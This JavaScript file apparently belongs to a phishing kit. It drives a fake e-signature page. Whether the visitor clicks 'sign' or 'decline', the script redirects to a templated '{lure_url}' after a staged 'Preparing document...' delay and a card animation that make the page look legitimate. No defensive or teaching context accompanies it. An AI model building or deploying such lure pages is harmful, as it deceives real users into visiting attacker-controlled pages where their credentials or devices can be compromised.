function signDocument() {
    const btn = document.querySelector('.btn-sign');
    btn.innerHTML = '<span>Preparing document...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1800);
}

function declineDocument() {
    if (confirm('Are you sure you want to decline signing this document?')) {
        window.location.href = '{lure_url}';
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.signing-card');
    card.style.opacity = '0';
    card.style.transform = 'translateY(30px)';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        card.style.opacity = '1';
        card.style.transform = 'translateY(0)';
    }, 150);
    
    const currentStep = document.querySelector('.status-step.current');
    if (currentStep) {
        currentStep.style.animation = 'pulse 2s infinite';
    }
});
